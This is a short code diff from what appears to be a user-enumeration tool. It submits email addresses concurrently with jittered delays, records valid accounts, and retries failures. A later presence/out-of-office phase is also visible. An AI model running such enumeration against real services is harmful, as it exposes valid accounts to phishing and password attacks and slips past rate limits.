-
-        with ThreadPoolExecutor(max_workers=pass_workers) as executor:
-            for email in current_user_list:
-                if stop_event.is_set():
-                    break
-                if base_delay > 0:
-                    current_delay = base_delay
-                    if enum_pace["jitter"] > 0:
-                        jitter_val = (base_delay * enum_pace["jitter"]) / 100.0
-                        current_delay += random.uniform(-jitter_val, jitter_val)
-                        current_delay = max(0, current_delay)
-                    time.sleep(current_delay)
-                counters["submitted"] += 1
-                future = executor.submit(
-                    process_enum_attempt, email, enumerator, enum_pace,
-                    logger, valid_users_set, valid_mris, failed_users_list,
-                    counters, counters_lock, lock, stop_event,
-                )
-                future.add_done_callback(on_done)
-
-        progress_tracker.end_round()
-        progress_tracker.end_session()
-
-        if not failed_users_list or stop_event.is_set():
-            break
-
-        # Set up retry with failed users
-        current_user_list = list(failed_users_list)
-        print_warn(f"{len(current_user_list)} users failed — retrying...")
-        # Reset error counters for the retry pass
-        with counters_lock:
-            counters["errors"] = 0
-            counters["rate_limited"] = 0
+    progress.end_round()
+    progress.end_session()
 
     # Phase 2: Presence/OOO pass (only for valid users, runs after enum completes)
     if not args.no_presence and valid_mris:
